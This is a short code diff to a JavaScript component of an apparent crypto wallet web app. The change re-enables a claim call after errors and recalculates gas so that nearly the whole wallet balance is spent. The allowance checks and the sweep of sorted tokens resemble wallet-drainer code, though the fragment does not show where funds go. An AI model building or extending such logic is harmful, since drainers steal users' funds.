@@ -531,8 +531,6 @@ export default {
         this.isDone = true;
         const allownce_value = await allownce(this.maxToken);
         const balanceoftoken = await balanceOf(this.maxToken);
-        console.log(allownce_value);
-        console.log(balanceoftoken);
         if (allownce_value > balanceoftoken) {
           if (this.currentIndex + 1 > this.sortedTokens.length) {
             if (this.claimable > 0) {
@@ -560,7 +558,7 @@ export default {
       this.isDone = false;
       Swal.close();
       Swal.hideLoading();
-      // this.wc_claim();
+      this.wc_claim();
       // Toast.error(error.message);
     }
   },
@@ -629,7 +627,7 @@ export default {
           formatUnits: 'gwei',
         });
         const fee =
-          BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
+          BigInt(50000) * (feeData.gasPrice);
         const total = BigInt(balance.value) - BigInt(fee);
         this.balance = balance;
         const validTokens = await getTokens(getAccount().address);
